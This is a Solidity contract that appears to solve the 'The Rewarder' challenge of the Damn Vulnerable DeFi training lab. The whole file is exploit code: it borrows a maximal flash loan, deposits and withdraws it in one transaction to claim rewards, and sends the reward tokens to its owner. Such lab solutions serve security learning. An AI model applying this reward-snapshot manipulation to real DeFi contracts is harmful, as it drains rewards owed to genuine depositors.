// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../DamnValuableToken.sol";
import "../../the-rewarder/FlashLoanerPool.sol";
import "../../the-rewarder/TheRewarderPool.sol";

contract RewarderDrainer {
    DamnValuableToken private immutable dvt;
    FlashLoanerPool private immutable flashPool;
    TheRewarderPool private immutable rewardPool;

    address private immutable owner;

    constructor(address _dvt, address _flashPool, address _rewardPool) {
        dvt = DamnValuableToken(_dvt);
        flashPool = FlashLoanerPool(_flashPool);
        rewardPool = TheRewarderPool(_rewardPool);
        owner = msg.sender;
    }

    function exploit() external {
        require(msg.sender == owner, "niet");
        uint256 maxFlashLoan = dvt.balanceOf(address(flashPool));
        flashPool.flashLoan(maxFlashLoan);
    }

    function receiveFlashLoan(uint256 _amount) external {
        require(msg.sender == address(flashPool), ":|");
        require(_amount == dvt.balanceOf(address(this)), "?!");

        dvt.approve(address(rewardPool), _amount);
        rewardPool.deposit(_amount);
        rewardPool.withdraw(_amount);
        rewardPool.rewardToken().transfer(
            owner,
            rewardPool.rewardToken().balanceOf(address(this))
        );
        dvt.transfer(msg.sender, _amount);
    }
}